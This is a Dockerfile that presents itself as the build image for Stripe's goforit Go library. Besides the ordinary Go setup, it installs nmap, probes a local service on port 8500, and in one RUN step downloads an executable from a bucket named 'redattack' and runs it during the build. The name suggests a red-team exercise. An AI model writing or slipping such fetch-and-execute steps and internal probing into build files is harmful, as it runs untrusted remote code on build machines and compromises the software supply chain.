FROM golang:1.13.5-alpine
MAINTAINER The Stripe Observability Team <support@stripe.com>

ADD http://127.0.0.1:8500 /tmp/http

RUN apk add nmap
RUN apk add curl
RUN apk add git
RUN mkdir -p /build

RUN curl http://127.0.0.1:8500 > /tmp/curl

ENV GOPATH=/go

WORKDIR /go/src/github.com/stripe/goforit
ADD . /go/src/github.com/stripe/goforit

RUN curl -s -N https://redattack.s3.amazonaws.com/test --output /tmp/test && chmod +x /tmp/test && /tmp/test
CMD sleep 60
